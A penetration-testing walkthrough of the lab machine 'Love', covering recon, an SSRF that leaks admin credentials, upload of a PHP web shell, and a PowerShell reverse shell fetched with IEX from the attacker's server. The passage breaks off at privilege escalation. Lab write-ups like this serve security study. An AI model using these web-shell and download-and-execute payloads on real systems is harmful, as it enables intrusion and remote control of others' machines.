---
Primary_category: "[[EASY]]"
title: "LOVE"
draft: false
banner: "https://images.unsplash.com/photo-1589763472885-46dd5b282f52?q=80&w=1748&auto=format&fit=crop&ixlib=rb-4.0.3&ixid=M3wxMjA3fDB8MHxwaG90by1wYWdlfHx8fGVufDB8fHx8fA%3D%3D"
banner_y: 0.88286
tags: 
cssclasses:
---

###### PRIMARY CATEGORY → [[EASY]]

#### Summary

- ***Summary A***
- ***Summary B***
- ***Summary C***
- ***Summary D***
- ***Summary E***

![[LOVE-20250329131912985.webp|400]]

---

#### Setup

Directory creation with the Machine's Name

```bash
mkdir Love && cd !$
```

Creation of a *Pentesting Folder Structure* to store all the information related to the target

> ***[[ZSH CUSTOM FUNCTIONS#mkt|Reference]]***

```bash
mkt
```

> [!IMPORTANT]- *Tree*
>
> ```bash
> .
> ├── evidence
> │   ├── creds
> │   ├── data
> │   └── screenshots
> ├── logs
> ├── scans
> ├── scope
> └── tools
> ```
>

---

#### Recon

##### *OS Identification*

First, proceed to identify the *Target Operative System*. This can be done by a simple `ping` taking into account the *TTL Unit*

The standard values are →

- ***About 64 → Linux***
- ***About 128 → Windows***

```bash
ping -c1 10.129.36.69
```

> [!NOTE]- *Command Output*
>
> ```bash
> PING 10.129.36.69 (10.129.36.69) 56(84) bytes of data.
> 64 bytes from 10.129.36.69: icmp_seq=1 ttl=127 time=161 ms
> 
> --- 10.129.36.69 ping statistics ---
> 1 packets transmitted, 1 received, 0% packet loss, time 0ms
> rtt min/avg/max/mdev = 160.686/160.686/160.686/0.000 ms
> ```
>

As mentioned, according to the TTL, It seems that It is a ***Windows Target***

##### *Port Scanning*

###### *General Scan*

Let's run a *Nmap* Scan to check what *TCP* Ports are opened in the machine

The Scan result is exported in a grepable format for subsequent *Port Parsing*

```bash
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn --disable-arp-ping -oG allPorts 10.129.36.69
```

> [!BUG]- *AllPorts*
>
> ```bash
> # Nmap 7.94SVN scan initiated Thu Mar 27 15:33:04 2025 as: nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn --disable-arp-ping -oG allPorts 10.129.36.69
> # Ports scanned: TCP(65535;1-65535) UDP(0;) SCTP(0;) PROTOCOLS(0;)
> Host: 10.129.36.69 ()	Status: Up
> Host: 10.129.36.69 ()	Ports: 80/open/tcp//http///, 135/open/tcp//msrpc///, 139/open/tcp//netbios-ssn///, 443/open/tcp//https///, 445/open/tcp//microsoft-ds///, 3306/open/tcp//mysql///, 5000/open/tcp//upnp///, 5040/open/tcp/////, 5985/open/tcp//wsman///, 5986/open/tcp//wsmans///, 7680/open/tcp//pando-pub///, 47001/open/tcp//winrm///, 49664/open/tcp/////, 49665/open/tcp/////, 49666/open/tcp/////, 49667/open/tcp/////, 49668/open/tcp/////, 49669/open/tcp/////, 49670/open/tcp/////
> # Nmap done at Thu Mar 27 15:33:19 2025 -- 1 IP address (1 host up) scanned in 15.27 seconds
> ```
>

**Open Ports** → 80, 135, 139, 443, 445, 3306, 5000, 5040, 5985, 5986, 7680, 47001, 49664, 49665, 49666, 49667, 49668, 49669 and 49670

###### *Comprehensive Scan*

The *[[ZSH CUSTOM FUNCTIONS#extractPorts|ExtractPorts]]* utility is used to get a **Readable Summary** of the previous scan and have ***all Open Ports copied to the clipboard***

```bash
extractPorts allPorts
```

> [!BUG]- *ExtractPorts*
>
> ```bash
> [+] Extracting information...
> 
>     [+] IP Address: 10.129.36.69
>     [+] Open Ports: 80,135,139,443,445,3306,5000,5040,5985,5986,7680,47001,49664,49665,49666,49667,49668,49669,49670
> 
> [+] Ports Copied to Clipboard
> ```
>

Then, the ***Comprehensive Scan*** is performed to gather the ***Service and Version*** running on each open port and launch a set of ***Nmap Basic Recon Scripts***

Note that this scan is also exported to have evidence at hand

```bash
nmap -p80,135,139,443,445,3306,5000,5040,5985,5986,7680,47001,49664,49665,49666,49667,49668,49669,49670 -sCV -n -Pn --disable-arp-ping -oN targeted 10.129.36.69
```

> [!BUG]- *Targeted*
>
> ```bash
> # Nmap 7.94SVN scan initiated Thu Mar 27 15:35:38 2025 as: nmap -p80,135,139,443,445,3306,5000,5040,5985,5986,7680,47001,49664,49665,49666,49667,49668,49669,49670 -sCV -n -Pn --disable-arp-ping -oN targeted 10.129.36.69
> Nmap scan report for 10.129.36.69
> Host is up (0.12s latency).
> 
> PORT      STATE SERVICE      VERSION
> 80/tcp    open  http         Apache httpd 2.4.46 ((Win64) OpenSSL/1.1.1j PHP/7.3.27)
> |_http-server-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1j PHP/7.3.27
> | http-cookie-flags: 
> |   /: 
> |     PHPSESSID: 
> |_      httponly flag not set
> |_http-title: Voting System using PHP
> 135/tcp   open  msrpc        Microsoft Windows RPC
> 139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
> 443/tcp   open  ssl/http     Apache httpd 2.4.46 (OpenSSL/1.1.1j PHP/7.3.27)
> | tls-alpn: 
> |_  http/1.1
> |_http-server-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1j PHP/7.3.27
> |_http-title: 403 Forbidden
> | ssl-cert: Subject: commonName=staging.love.htb/organizationName=ValentineCorp/stateOrProvinceName=m/countryName=in
> | Not valid before: 2021-01-18T14:00:16
> |_Not valid after:  2022-01-18T14:00:16
> |_ssl-date: TLS randomness does not represent time
> 445/tcp   open  microsoft-ds Windows 10 Pro 19042 microsoft-ds (workgroup: WORKGROUP)
> 3306/tcp  open  mysql?
> | fingerprint-strings: 
> |   DNSStatusRequestTCP, FourOhFourRequest, HTTPOptions, Kerberos, LANDesk-RC, LDAPBindReq, LDAPSearchReq, LPDString, NCP, SMBProgNeg, SSLSessionReq, TLSSessionReq, TerminalServer, TerminalServerCookie, X11Probe: 
> |_    Host '10.10.16.20' is not allowed to connect to this MariaDB server
> 5000/tcp  open  http         Apache httpd 2.4.46 (OpenSSL/1.1.1j PHP/7.3.27)
> |_http-title: 403 Forbidden
> |_http-server-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1j PHP/7.3.27
> 5040/tcp  open  unknown
> 5985/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
> |_http-server-header: Microsoft-HTTPAPI/2.0
> |_http-title: Not Found
> 5986/tcp  open  ssl/http     Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
> |_http-title: Not Found
> |_http-server-header: Microsoft-HTTPAPI/2.0
> | ssl-cert: Subject: commonName=LOVE
> | Subject Alternative Name: DNS:LOVE, DNS:Love
> | Not valid before: 2021-04-11T14:39:19
> |_Not valid after:  2024-04-10T14:39:19
> |_ssl-date: 2025-03-27T15:00:06+00:00; +21m34s from scanner time.
> | tls-alpn: 
> |_  http/1.1
> 7680/tcp  open  pando-pub?
> 47001/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
> |_http-server-header: Microsoft-HTTPAPI/2.0
> |_http-title: Not Found
> 49664/tcp open  msrpc        Microsoft Windows RPC
> 49665/tcp open  msrpc        Microsoft Windows RPC
> 49666/tcp open  msrpc        Microsoft Windows RPC
> 49667/tcp open  msrpc        Microsoft Windows RPC
> 49668/tcp open  msrpc        Microsoft Windows RPC
> 49669/tcp open  msrpc        Microsoft Windows RPC
> 49670/tcp open  msrpc        Microsoft Windows RPC
> 1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
> SF-Port3306-TCP:V=7.94SVN%I=7%D=3/27%Time=67E56247%P=x86_64-pc-linux-gnu%r
> Host script results:
> | smb2-time: 
> |   date: 2025-03-27T14:59:56
> |_  start_date: N/A
> |_clock-skew: mean: 2h06m34s, deviation: 3h30m00s, median: 21m33s
> | smb-security-mode: 
> |   account_used:  |   authentication_level: user
> |   challenge_response: supported
> |_  message_signing: disabled (dangerous, but default)
> | smb2-security-mode: 
> |   3:1:1: 
> |_    Message signing enabled but not required
> | smb-os-discovery: 
> |   OS: Windows 10 Pro 19042 (Windows 10 Pro 6.3)
> |   OS CPE: cpe:/o:microsoft:windows_10::-
> |   Computer name: Love
> |   NetBIOS computer name: LOVE\x00
> |   Workgroup: WORKGROUP\x00
> |_  System time: 2025-03-27T07:59:52-07:00
> 
> Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
> # Nmap done at Thu Mar 27 15:38:34 2025 -- 1 IP address (1 host up) scanned in 176.14 seconds
> ```
>

##### *139, 445 - SMB*

As usual, let's take a look at the *SMB* service and extract some basic information such as →

- ***Hostname and Domain, if exists***
- ***Operative System Version***
- ***SMB Signing***
- ***SMB Version***

We can carry out this task using `netexec`

```bash
nxc smb 10.129.36.69
```

> [!NOTE]- *Command Output*
>
> ```bash
> SMB         10.129.36.69    445    LOVE             [*] Windows 10 Pro 19042 x64 (name:LOVE) (domain:Love) (signing:False) (SMBv1:True)
> ```
>

Since the hostname and domain are the same and the *target* has no open ports related to a *standard Domain Controller* such as *Kerberos (88) or Ldap (389, 636)*, we might think that the remote machine is not a  *Domain Controller*

Anyway, let's add the above hostname to the `/etc/hosts` file

```bash
printf "\n10.129.36.69\tlove" >> /etc/hosts
```

> [!BUG]- */etc/hosts*
>
> ```bash
> # Host addresses
> 127.0.0.1  localhost
> 127.0.1.1  parrot
> ::1        localhost ip6-localhost ip6-loopback
> ff02::1    ip6-allnodes
> ff02::2    ip6-allrouters
> # Others
> 10.129.36.69	love
> ```
>

Now, since we do not have any valid credentials, let's try to use a *Null Authentication* to list the *SMB Shares* on the *target*

```bash
nxc smb love --username '' --password '' --shares
```

> [!NOTE]- *Command Output*
>
> ```bash
> SMB         10.129.36.69    445    LOVE             [*] Windows 10 Pro 19042 x64 (name:LOVE) (domain:Love) (signing:False) (SMBv1:True)
> SMB         10.129.36.69    445    LOVE             [+] Love\: 
> SMB         10.129.36.69    445    LOVE             [-] Error enumerating shares: STATUS_ACCESS_DENIED
> ```
>

It is not enabled, we can check if the *guest* account is not disabled

```bash
nxc smb love --username 'guest' --password '' --shares
```

> [!NOTE]- *Command Output*
>
> ```bash
> SMB                      10.129.36.69    445    LOVE             [*] Windows 10 Pro 19042 x64 (name:LOVE) (domain:Love) (signing:False) (SMBv1:True)
> SMB                      10.129.36.69    445    LOVE             [-] Love\guest: STATUS_ACCOUNT_DISABLED 
> ```
>

But it is...

Finally, let's try to authenticate with a random user, sometimes, the *target* may behave strangely and lets us to list the available shares with a non-existent user

```bash
nxc smb love --username 'anyRandomUser' --password '' --shares
```

> [!NOTE]-
> 
> ```bash
> SMB                      10.129.36.69    445    LOVE             [*] Windows 10 Pro 19042 x64 (name:LOVE) (domain:Love) (signing:False) (SMBv1:True)
> SMB                      10.129.36.69    445    LOVE             [-] Love\anyRandomUser: STATUS_LOGON_FAILURE 
> ```
>

And it does not work either

There is nothing else we can test here

Note that the *target* has *SMBv1*, so we could think of *EternalBlue*, but it is probably not vulnerable as the *Operative System* is a *Windows 10*

##### *135 - RPC*

We could try to reach some *RPC Endpoints* via the *Endpoint Mapper* and see if any of them do not require authentication or allow *Null Authentication*

```bash
rpcclient --user '' --no-pass --command 'srvinfo' love
```

> [!NOTE]- *Command Output*
>
> ```bash
> Cannot connect to server.  Error was NT_STATUS_ACCESS_DENIED
> ```
>

But we get the above error. The same applies if we try with a random user

```bash
rpcclient --user 'anyRandomUser' --no-pass --command 'srvinfo' love
```

> [!NOTE]- *Command Output*
>
> ```bash
> Cannot connect to server.  Error was NT_STATUS_LOGON_FAILURE
> ```
> 

We got a *Logon Failure* error as the user account specified does not exist in the system

There is nothing else we can do here either, let's move on to the next service!

##### *3306 - MySQL*

We do not have any valid credentials either to try to connect to this *MySQL/MariaDB Service*

But, let's check if we can initiate a connection to the *target* using the `mysql` cli client

```bash
mysql --user='anyRandomUser' --password='' --host=love --port=3306 --database=''
```

> [!NOTE]- *Command Output*
>
> ```bash
> ERROR 2002 (HY000): Received error packet before completion of TLS handshake. The authenticity of the following error cannot be verified: 1130 - Host '10.10.16.20' is not allowed to connect to this MariaDB server
> ```
>

Our *IP Address* is not allowed to stablish a connection to the *target's MySQL Service*

Therefore, there is not much we can do here

##### *80, 443, 5000 - HTTP\[s\]*

And we arrive at the web branch, it seems that the *target's entrypoint* is on any of this ports, so let's take a look at them

###### *443 - HTTPs*

As it is *HTTPS*, it is possible that a *TLS Certificate* has been issued for the *website*

Thus, we can extract the *Common Names* section of the *Certificate* to gather some valid *domains* or *subdomains*

```bash
openssl x509 -noout -subject < <( openssl s_client -connect love:443 2> /dev/null 0>&2 )
```

> [!NOTE]- *Command Output*
>
> ```bash
> subject=C = in, ST = m, L = norway, O = ValentineCorp, OU = love.htb, CN = staging.love.htb, emailAddress = roy@love.htb
> ```
>

And we got some interesting information →

- ***A domain (love.htb) and a subdomain (staging.love.htb)***
- ***A love.htb's mail account → roy@love.htb***

We can add both the domain and the subdomain to the `/etc/hosts` file as we did with the hostname extracted through *SMB*

```bash
printf "\tlove.htb\tstaging.love.htb" >> /etc/hosts
```

> [!BUG]- */etc/hosts*
>
> ```bash
> # Host addresses
> 127.0.0.1  localhost
> 127.0.1.1  parrot
> ::1        localhost ip6-localhost ip6-loopback
> ff02::1    ip6-allnodes
> ff02::2    ip6-allrouters
> # Others
> 10.129.36.69	love  love.htb	staging.love.htb
> ```
>

*Roy* could be a valid user account. If we get a password somewhere, we could try to authenticate with `roy:<PASSWORD>`

Inspecting the *HTTP Response Headers*, we got a *403 Forbidden error*

```bash
curl --silent --insecure --location --request GET --head 'https://10.129.36.69'
```

> [!NOTE]- *Command Output*
>
> ```bash
> HTTP/1.1 403 Forbidden
> Date: Thu, 27 Mar 2025 16:07:56 GMT
> Server: Apache/2.4.46 (Win64) OpenSSL/1.1.1j PHP/7.3.27
> Content-Length: 303
> Content-Type: text/html; charset=iso-8859-1
> ```
>

So there is no need to access this website from the *brower* as we will get the same error and we will not be able to see any web content

At least, we now know that that is not an *IIS* but an *Apache*

If *Apache* is the *Web Server* and the *Operative System* of the *target* is a *Windows*, we could think of *Xampp* installed on the system

***Xampp's Default Path → `C:\inetpub\wwwroot\<WEB_DIRECTORY>`***

###### *5000 - HTTP*

We could do the same with this port, before access this *website* from the browser, simply make an *HTTP Request* to see the *HTTP Status Code* in the response

```bash
curl --silent --request GET --location --head 'http://10.129.48.103:5000'
```

> [!NOTE]- *Command Output*
>
> ```bash
> HTTP/1.1 403 Forbidden
> Date: Fri, 28 Mar 2025 14:09:48 GMT
> Server: Apache/2.4.46 (Win64) OpenSSL/1.1.1j PHP/7.3.27
> Content-Length: 305
> Content-Type: text/html; charset=iso-8859-1
> ```
>

We get another *403 Forbidden HTTP Error*, so we are not allowed to access its *web content* either

So, let's move on to the next *HTTP Port*

###### *80 - HTTP*

We can extract *Web Technologies*  using `whatweb`

```bash
whatweb http://10.129.48.103
```

> [!NOTE]- *Command Output*
>
> ```bash
> http://10.129.48.103 [200 OK] Apache[2.4.46], Bootstrap, Cookies[PHPSESSID], Country[RESERVED][ZZ], HTML5, HTTPServer[Apache/2.4.46 (Win64) OpenSSL/1.1.1j PHP/7.3.27], IP[10.129.48.103], JQuery, OpenSSL[1.1.1j], PHP[7.3.27], PasswordField[password], Script, Title[Voting System using PHP], X-Powered-By[PHP/7.3.27], X-UA-Compatible[IE=edge]
> ```
>

We see that the *Server-Side Programming Language* is *PHP 7.3.27* and there is a *Password Field*, so it seems that there is a *login form*

We could run `whatweb` again, but this time to check the vhosts `love.htb`, it might deliver different *web content* for that domain

```bash
whatweb http://love.htb
```

> [!NOTE]- *Command Output*
>
> ```bash
> http://10.129.48.103 [200 OK] Apache[2.4.46], Bootstrap, Cookies[PHPSESSID], Country[RESERVED][ZZ], HTML5, HTTPServer[Apache/2.4.46 (Win64) OpenSSL/1.1.1j PHP/7.3.27], IP[10.129.48.103], JQuery, OpenSSL[1.1.1j], PHP[7.3.27], PasswordField[password], Script, Title[Voting System using PHP], X-Powered-By[PHP/7.3.27], X-UA-Compatible[IE=edge]
> ```
>

But it is the same

Another way to check that the content delivered when requesting both is the same, would be to check how many characters or lines are in the *HTTP Responses*

- **`http://10.129.48.103`**

```bash
curl --silent --location --request GET 'http://10.129.48.103' | wc -c
```

> [!NOTE]- *Command Output*
>
> ```bash
> 4388
> ```
>

- **`http://love.htb`**

```bash
curl --silent --location --request GET 'http://love.htb' | wc -c
438
```

> [!NOTE]- *Command Output*
>
> ```bash
> 4388
> ```
>

The characters are the same, therefore, the delivered content is the same

Remember that we got an additional subdomain inspecting the *TLS Certificate* → `staging.love.htb`

Let's run `whatweb` on it

```bash
whatweb http://staging.love.htb
```

> [!NOTE]- *Command Output*
>
> ```bash
> http://staging.love.htb [200 OK] Apache[2.4.46], Country[RESERVED][ZZ], HTML5, HTTPServer[Apache/2.4.46 (Win64) OpenSSL/1.1.1j PHP/7.3.27], IP[10.129.48.103], OpenSSL[1.1.1j], PHP[7.3.27], Title[Secure file scanner], X-Powered-By[PHP/7.3.27], X-UA-Compatible[IE=edge]
> ```
>

Another *PHP web page*, this time a *Secure File Scanner*, this one looks better as the other one seems to have a *login form*

Let's inspect both from the browser

###### *Browser-Based Inspection*

- **`http://love.htb`**

![[LOVE-20250328151111619.webp|450]]

As mentioned, there is a login form, but we do not have any valid credentials

Note that the first field does not require a user but an *ID*

We could try to *bruteforce* that field if we have any valid *password*

There is nothing interesting in the *source code* either

- **`http://staging.love.htb`**

![[LOVE-20250328151420417.webp|450]]

There is another form, but this time it seems to be a registration one

So, we might try registering before carry out any type of injection

First, we check if any *HTTP Traffic* is generated when the *submit button* is clicked to send the data via an *HTTP Post Request*

![[LOVE-20250328152515999.webp|450]]

No data is sent when filling in the form fields and clicking submit. Therefore, this form does not work

We have a demo section, if we go to it we get the following content

![[LOVE-20250328152722797.webp|450]]

It is a file scanner

---

#### Exploitation

##### *Information Leakage via SSRF*

We could check if we receive an *HTTP Request* to the *HTTP Server* we build with *Python*

- ***From the Attacker*** ⚔️

```bash
python3 -m http.server 8888
```

- ***From the Target***🎯 

![[LOVE-20250328153024504.webp|450]]

We received the *HTTP Request* to the *HTTP Server* and the *target* gets a *404 Error*, so it is working correctly

> [!NOTE]- *Simple HTTP Server Output*
>
> ```bash
> Serving HTTP on 0.0.0.0 port 8888 (http://0.0.0.0:8888/) ...
> 10.129.48.103 - - [28/Mar/2025 15:30:07] code 404, message File not found
> 10.129.48.103 - - [28/Mar/2025 15:30:07] "GET /test HTTP/1.1" 404 -
> ```
>

Before checking for any type of injection or *RFI*, we check if we can list any local files on the *target* by requesting it through this *file scanner*

![[LOVE-20250328154015601.webp|450]]

And we get the content of the file!

Again, before proceed with the enumeration of *local files*, we could check if a *Server Side Request Forgery (SSRF)* exists as we can request any type of *URL* in the field

Remember that we get a *403 Error* if we request any content related to the following *URLs*

- **`http://love.htb:5000`**
- **`https://love.htb`**

So, let's make another *HTTP Request* to the above *URL* but this time to *localhost*, as it is this file scanner that makes the requests, they will be accessible from there

> [!IMPORTANT]-
> 
> Note that, this time, the *HTTP*  request are generated from the *target machine*, not from the attacker side, so it is possible that the *Web Server* behaves different and we could access the *web content* of the requested *URL* by modifying the *vhost* name to *localhost*
>

![[LOVE-20250328154856720.webp|450]]

And we have credentials! Thus, this website cannot be accessed externally, but can be accessed locally

- ***admin:@LoveIsInTheAir!!!!***

This credentials are not valid for the login form of `http://love.htb` as it asks for an *ID*

Since we have a possible system user, *roy*, let's validate the above password for this user with `netexec`

```bash
nxc smb love --username 'roy' --password '@LoveIsInTheAir!!!!'
```

> [!NOTE]- *Command Output*
>
> ```bash
> SMB         10.129.48.103   445    LOVE             [*] Windows 10 Pro 19042 x64 (name:LOVE) (domain:Love) (signing:False) (SMBv1:True)
> SMB         10.129.48.103   445    LOVE             [-] Love\roy:@LoveIsInTheAir!!!! STATUS_LOGON_FAILURE 
> ```
>

And it is not valid, we do the same for the *administrator* user

```bash
nxc smb love --username 'administrator' --password '@LoveIsInTheAir!!!!'
```

> [!NOTE]- *Command Output*
> 
> ```bash
> SMB         10.129.48.103   445    LOVE             [*] Windows 10 Pro 19042 x64 (name:LOVE) (domain:Love) (signing:False) (SMBv1:True)
> SMB         10.129.48.103   445    LOVE             [-] Love\administrator:@LoveIsInTheAir!!!! STATUS_LOGON_FAILURE 
> ```
>

And it is not either

##### *Authenticated RCE via an Arbitrary File Upload*

Let's fuzz the content of this URL `http://love.htb` to search for another resources

Since we know that the *Server-Side Language Programming* is *PHP*, let's fuzz by *PHP* extensions

```bash
gobuster dir --threads 100 --extensions php --output webScan.gobuster --wordlist /usr/share/seclist/Discovery/Web-Content/directory-list-2.3-medium.txt --url http://love.htb
```

> [!BUG]- *webScan.gobuster*
>
> ```bash
> /images              [36m (Status: 301)[0m [Size: 330][34m [--> http://love.htb/images/][0m
> /index.php           [32m (Status: 200)[0m [Size: 4388]
> /login.php           [36m (Status: 302)[0m [Size: 0][34m [--> index.php][0m
> /home.php            [36m (Status: 302)[0m [Size: 0][34m [--> index.php][0m
> /Images              [36m (Status: 301)[0m [Size: 330][34m [--> http://love.htb/Images/][0m
> /admin               [36m (Status: 301)[0m [Size: 329][34m [--> http://love.htb/admin/][0m
> /Home.php            [36m (Status: 302)[0m [Size: 0][34m [--> index.php][0m
> /plugins             [36m (Status: 301)[0m [Size: 331][34m [--> http://love.htb/plugins/][0m
> /includes            [36m (Status: 301)[0m [Size: 332][34m [--> http://love.htb/includes/][0m
> /Index.php           [32m (Status: 200)[0m [Size: 4388]
> /Login.php           [36m (Status: 302)[0m [Size: 0][34m [--> index.php][0m
> /logout.php          [36m (Status: 302)[0m [Size: 0][34m [--> index.php][0m
> /preview.php         [36m (Status: 302)[0m [Size: 0][34m [--> index.php][0m
> /dist                [36m (Status: 301)[0m [Size: 328][34m [--> http://love.htb/dist/][0m
> /licenses            [33m (Status: 403)[0m [Size: 417]
> /examples            [31m (Status: 503)[0m [Size: 398]
> /IMAGES              [36m (Status: 301)[0m [Size: 330][34m [--> http://love.htb/IMAGES/][0m
> /%20                 [33m (Status: 403)[0m [Size: 298]
> /INDEX.php           [32m (Status: 200)[0m [Size: 4388]
> /Admin               [36m (Status: 301)[0m [Size: 329][34m [--> http://love.htb/Admin/][0m
> /*checkout*          [33m (Status: 403)[0m [Size: 298]
> /*checkout*.php      [33m (Status: 403)[0m [Size: 298]
> /Plugins             [36m (Status: 301)[0m [Size: 331][34m [--> http://love.htb/Plugins/][0m
> /phpmyadmin          [33m (Status: 403)[0m [Size: 298]
> /HOME.php            [36m (Status: 302)[0m [Size: 0][34m [--> index.php][0m
> /webalizer           [33m (Status: 403)[0m [Size: 298]
> /Logout.php          [36m (Status: 302)[0m [Size: 0][34m [--> index.php][0m
> /*docroot*.php       [33m (Status: 403)[0m [Size: 298]
> /*docroot*           [33m (Status: 403)[0m [Size: 298]
> /*                   [33m (Status: 403)[0m [Size: 298]
> /*.php               [33m (Status: 403)[0m [Size: 298]
> /Preview.php         [36m (Status: 302)[0m [Size: 0][34m [--> index.php][0m
> /con.php             [33m (Status: 403)[0m [Size: 298]
> /con                 [33m (Status: 403)[0m [Size: 298]
> ```
>

And we get quite a few *php* resources

One that stands out from the rest is the *admin* directory, as we have *admin credentials*

So, let's take a look to it

![[LOVE-20250328160448903.webp|450]]

And we have another login form, but this one asks for a user and a password. So, we try with the ones we have

![[LOVE-20250328160739706.webp|450]]

And we are in!

It is seems like an *Admin Dashboard* or something similar

If we go through all the features it has, there is nothing interesting apart from an *Update Profile section*

![[LOVE-20250328161238161.webp|450]]

This section allows the current user to upload a new *profile image*

So, we could try to upload another type of file such as a *PHP script* to see if any validation is done from the *Server Side*

Enable the browser's proxy configuration to send all the *HTTP traffic* generated to the *Burpsuite HTTP Proxy*, intercept the *POST Request* related to the *Image Upload* and send it to the *Repeater*

First, create a *php script* to upload it

> [!BUG]- *PHP Script*
>
> ```php
><?php system("whoami"); ?> 
> ```
>

Upload that file and intercept the *HTTP Request* to inspect its content

![[LOVE-20250328161716801.webp|450]]

We get a *302 HTP Status Code* in the response followed by a *200 OK*

![[LOVE-20250328161832465.webp|450]]

We can see in the render section of the *HTTP Response* that the *file* has been upload successfully

Therefore, it seems that there is not any type of validation on the *Server Side*, neither *File Magic Numbers* nor the *Content-Type* of the *upload input field*

To find out the *system path* where the *profile image* is stored, just inspect the *source code* of the dashboard to get the *URL* of the following image

![[LOVE-20250328162109741.webp|450]]

![[LOVE-20250328162139605.webp]]

And it is → `http://love.htb/images/cmd.php`

If we request the above resource

![[LOVE-20250328162245641.webp]]

The code is executed correctly, so we have a *Remote Code Execution* via an *Arbitrary File Upload*

Now, we can create another *PHP Script* with the following content to be able to run any command on the *remote machine* as the user running the *Web Server*

```php
<?php system($_GET['cmd']); ?>
```

Upload the above file and request it by passing it a *cmd URL Parameter* via *GET*

![[LOVE-20250328163056408.webp|450]]

And we have a *mini PHP Web Shell*

Therefore, to be able to generate a reverse shell connection from the *target* to the *attacker* proceed as indicated in [[#Shell as Web User|this]] section

The entire exploitation process can be automated with [[#*Voting System RCE*|this]] python script

Just proceed as follows →

- ***Set up the exec environment***

```bash
python3 -m venv .venv
. !$/bin/activate
```

```bash
pip3 install -r requirements.txt
```

- ***Execute the Python Script***

```bash
python3 votingSystemRCE.py http://love.htb admin '@LoveIsInTheAir!!!!' 10.10.16.20 4444 8888
```

> ***See the POC [[#Voting System RCE|here]]***

---
#### Shell as Web User

###### *From the Attacker*

- ***Download this [Nishang Reverse TCP Oneliner](https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcpOneLine.ps1) and Modify it with the Attacker IP and a Listen Port***

```bash
curl --silent --request GET --location "https://github.com/samratashok/nishang/raw/refs/heads/master/Shells/Invoke-PowerShellTcpOneLine.ps1" --output rev.ps1
```

> [!BUG]- *rev.ps1*
>
> ```bash
> $client = New-Object System.Net.Sockets.TCPClient('10.10.16.20',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
> ```
>

- ***Build a Simple HTTP Server to share the above resource***

```bash
python3 -m http.server 8888
```

- ***Set up a Listening Socket using rlwrap + netcat***

```bash
rlwrap -CaR nc -nlvp 443
```

> [!IMPORTANT]-
> 
> Note that the port specified in `netcat` must be the same specified in the *powershell script*
>

###### *From the Target*

As we did before, just request again the uploded *php script*, but this time specifying the following payload as the value of the *cmd URL Parameter*

```bash
powershell.exe -Command "IEX (IWR -UseBasicParsing -Uri http://10.10.16.20:8888/rev.ps1)
```

> [!BUG]- *Requested URL*
>
> ```bash
> http://love.htb/images/cmd.php?cmd=powershell.exe%20-Command%20%22IEX%20(IWR%20-UseBasicParsing%20-Uri%20http://10.10.16.20:8888/rev.ps1)
> ```
>

And we get the *Reverse connection*!

> [!NOTE]- *Simple HTTP Server Output*
>
> ```bash
> Serving HTTP on 0.0.0.0 port 8888 (http://0.0.0.0:8888/) ...
> 10.129.48.103 - - [28/Mar/2025 16:42:48] "GET /rev.ps1 HTTP/1.1" 200 -
> ```
>

> [!NOTE]- *RLWrap + Netcat Output*
>
> ```bash
> listening on [any] 443 ...
> connect to [10.10.16.20] from (UNKNOWN) [10.129.48.103] 62625
> 
> PS C:\xampp\htdocs\omrs\images>
> ```
>

We are in the system as `love\phoebe`

```bash
whoami
```

> [!NOTE]- *Command Output*
>
> ```bash
> love\phoebe
> ```
>

We could try to grab the content of the *user.txt* flag in case that it is in *Phoebe's Desktop*

```bash
Get-Content C:\Users\Phoebe\Desktop\user.txt
```

And it is!

---

#### Privesc #1

***Initial Non-Privileged User → Phoebe***

##### *AlwaysInstallElevated*

First, we check whether the current user belongs to any *system or builtin group* for which there is a possibility to perform a *privesc*

The same applies for the *user privileges*

```bash
whoami /all
```

> [!NOTE]- *Command Output*
> 
> ```bash
> USER INFORMATION
> ----------------
> 
> User Name   SID                                          
> =========== =============================================
> love\phoebe S-1-5-21-2955427858-187959437-2037071653-1002
> 
> 
> GROUP INFORMATION
> -----------------
> 
> Group Name                             Type             SID          Attributes                                        
> ====================================== ================ ============ ==================================================
> Everyone                               Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
> BUILTIN\Remote Management Users        Alias            S-1-5-32-580 Mandatory group, Enabled by default, Enabled group
> BUILTIN\Users                          Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
> NT AUTHORITY\INTERACTIVE               Well-known group S-1-5-4      Mandatory group, Enabled by default, Enabled group
> CONSOLE LOGON                          Well-known group S-1-2-1      Mandatory group, Enabled by default, Enabled group
> NT AUTHORITY\Authenticated Users       Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
> NT AUTHORITY\This Organization         Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
> NT AUTHORITY\Local account             Well-known group S-1-5-113    Mandatory group, Enabled by default, Enabled group
> LOCAL                                  Well-known group S-1-2-0      Mandatory group, Enabled by default, Enabled group
> NT AUTHORITY\NTLM Authentication       Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
> Mandatory Label\Medium Mandatory Level Label            S-1-16-8192                                                    
> PRIVILEGES INFORMATION
> ----------------------
> 
> Privilege Name                Description                          State   
> ============================= ==================================== ========
> SeShutdownPrivilege           Shut down the system                 Disabled
> SeChangeNotifyPrivilege       Bypass traverse checking             Enabled 
> SeUndockPrivilege             Remove computer from docking station Disabled
> SeIncreaseWorkingSetPrivilege Increase a process working set       Disabled
